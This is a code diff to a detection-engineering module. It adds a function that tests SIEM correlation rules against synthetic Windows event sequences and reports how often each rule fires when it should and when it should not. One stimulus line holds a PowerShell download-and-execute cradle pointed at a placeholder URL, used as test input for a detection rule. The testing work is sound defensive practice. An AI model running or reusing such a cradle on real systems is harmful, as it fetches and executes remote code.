@@ -34,7 +34,7 @@ from pathlib import Path
 from .rules import RuleEngine, event_fields, rule_matches
 
 __all__ = ["RuleScore", "measure_corpus", "format_scores", "load_corpus",
-           "default_corpus_path", "measurement_snapshot"]
+           "default_corpus_path", "measurement_snapshot", "measure_correlation"]
 
 
 def _technique_key(tag: str) -> str:
@@ -386,3 +386,155 @@ def measurement_snapshot(corpus_path: str | Path | None = None,
     if use_cache:
         _SNAPSHOT_CACHE[key] = result
     return result
+
+
+# --- correlation -----------------------------------------------------------
+#
+# A correlation rule does not judge one event. It fires when two detection rules
+# match *in order, on the same host or account, inside a time window* -- and the
+# only way to know whether that logic works is to hand it sequences whose answer
+# is known.
+#
+# The stimulus below is constructed rather than captured, and that is stated
+# rather than glossed. The corpus contains no instance of most of these
+# sequences: there has been no account created on this machine during a capture,
+# no lockout, no service installed, no audit log cleared. Each stimulus is
+# verified against the detection rule it claims to trip -- `rule_matches` is run
+# on it before it is used -- so a scenario cannot quietly stop representing what
+# it says it represents. What is measured here is the ordering, the grouping and
+# the window, which is what correlation is; whether the constituent rules
+# themselves fire is measured separately, on real telemetry.
+_CORRELATION_STIMULUS: dict[str, dict] = {
+    "win-suspicious-powershell-script-block": {
+        "channel": "Microsoft-Windows-PowerShell/Operational", "event_id": "4104",
+        "message": "ScriptBlock: iex (New-Object Net.WebClient).DownloadString('http://x/y')"},
+    "sysmon-network-connection-to-remote-port": {
+        "channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "3",
+        "fields": {"DestinationIp": "203.0.113.9", "DestinationPort": "443"}},
+    "win-failed-logon": {"channel": "Security", "event_id": "4625"},
+    "win-account-locked-out": {"channel": "Security", "event_id": "4740"},
+    "win-account-created": {"channel": "Security", "event_id": "4720"},
+    "win-privileged-group-local": {"channel": "Security", "event_id": "4732"},
+    "win-service-installed": {"channel": "System", "event_id": "7045"},
+    "win-audit-log-cleared": {"channel": "Security", "event_id": "1102"},
+}
+
+# Which grouping field each correlation rule uses, so a scenario can be built on
+# the right one without reading the rule object.
+_GROUP_FIELDS = {"host": "host", "username": "username"}
+
+
+def _stimulus_event(rule_id: str, timestamp: str, host: str, username: str) -> dict:
+    template = _CORRELATION_STIMULUS[rule_id]
+    event = {
+        "rule_id": rule_id,
+        "timestamp": timestamp,
+        "host": host,
+        "username": username,
+        "channel": template.get("channel", ""),
+        "event_id": template.get("event_id", ""),
+        "message": template.get("message", ""),
+        "fields": dict(template.get("fields") or {}),
+        "id": 0,
+    }
+    return event
+
+
+def _iso(offset_seconds: int) -> str:
+    import datetime
+    base = datetime.datetime(2026, 1, 1, 12, 0, 0)
+    return (base + datetime.timedelta(seconds=offset_seconds)).strftime("%Y-%m-%d %H:%M:%S")
+
+
+def measure_correlation(engine: RuleEngine | None = None) -> dict:
+    """Score every correlation rule against sequences whose answer is known.
+
+    Each rule gets one scenario that should fire it and three that should not:
+    the same steps in the wrong order, the same steps outside the rule's own
+    window, and the same steps split across two hosts or accounts. A rule that
+    fires on any of the three is reporting a sequence that did not happen.
+    """
+    from .correlation import build_correlation_payloads
+
+    engine = engine or RuleEngine.from_directory()
+    # correlation rules live beside the detection rules, not among them
+    correlation_rules = list(getattr(engine, "correlations", []) or [])
+    detection = {rule.id: rule for rule in engine.rules}
+
+    results = []
+    for rule in correlation_rules:
+        steps = list(rule.steps)[: max(1, int(getattr(rule, "min_steps", len(rule.steps))))]
+        window = int(getattr(rule, "window_seconds", 120))
+        group = str(getattr(rule, "group_by", "host"))
+
+        # every stimulus must actually trip the rule it stands for
+        unverified = [step for step in steps
+                      if step not in detection
+                      or not rule_matches(event_fields(_stimulus_event(step, _iso(0), "H", "U")),
+                                          detection[step])]
+
+        def scenario(offsets, hosts):
+            return [_stimulus_event(step, _iso(offset), hosts[index], hosts[index])
+                    for index, (step, offset) in enumerate(zip(steps, offsets))]
+
+        in_order = [index * 10 for index in range(len(steps))]
+        positives = scenario(in_order, ["HOST-A"] * len(steps))
+        negatives = {
+            "out of order": scenario(list(reversed(in_order)), ["HOST-A"] * len(steps)),
+            "outside the window": scenario([index * (window + 30) for index in range(len(steps))],
+                                           ["HOST-A"] * len(steps)),
+            "different groups": scenario(in_order, ["HOST-%d" % index for index in range(len(steps))]),
+        }
+
+        def fires(events):
+            return any(payload.get("event_id") == rule.id
+                       for payload in build_correlation_payloads(events, [rule]))
+
+        fired_positive = fires(positives)
+        false_scenarios = [name for name, events in negatives.items() if fires(events)]
+        results.append({
+            "rule_id": rule.id,
+            "level": getattr(rule, "level", ""),
+            "steps": steps,
+            "group_by": group,
+            "window_seconds": window,
+            "fires_when_it_should": fired_positive,
+            "fires_when_it_should_not": false_scenarios,
+            "verified_stimulus": not unverified,
+            "unverified_steps": unverified,
+            "precision": 0.0 if false_scenarios else (1.0 if fired_positive else None),
+            "recall": 1.0 if fired_positive else 0.0,
+        })
+
+    detected = [row for row in results if row["fires_when_it_should"]]
+    return {
+        "rules": results,
+        "total": len(results),
+        "fired_when_they_should": len(detected),
+        "fired_when_they_should_not": sum(len(row["fires_when_it_should_not"]) for row in results),
+        "unverified_stimulus": sum(1 for row in results if not row["verified_stimulus"]),
+    }
+
+
+def format_correlation(result: dict) -> str:
+    lines = [
+        "%-38s %-6s %8s %10s %9s" % ("correlation rule", "level", "fires", "spurious", "verified"),
+        "-" * 78,
+    ]
+    for row in result["rules"]:
+        lines.append("%-38s %-6s %8s %10d %9s" % (
+            row["rule_id"][:38], str(row["level"])[:6],
+            "yes" if row["fires_when_it_should"] else "NO",
+            len(row["fires_when_it_should_not"]),
+            "yes" if row["verified_stimulus"] else "NO"))
+    lines.append("")
+    lines.append("%d of %d correlation rules fire on the sequence they describe."
+                 % (result["fired_when_they_should"], result["total"]))
+    lines.append("%d spurious firings across the scenarios that should stay quiet "
+                 "(wrong order, outside the window, split across groups)."
+                 % result["fired_when_they_should_not"])
+    if result["unverified_stimulus"]:
+        lines.append("%d rules use a stimulus that does not actually trip its own "
+                     "detection rule, so their scenario proves nothing."
+                     % result["unverified_stimulus"])
+    return "\n".join(lines)
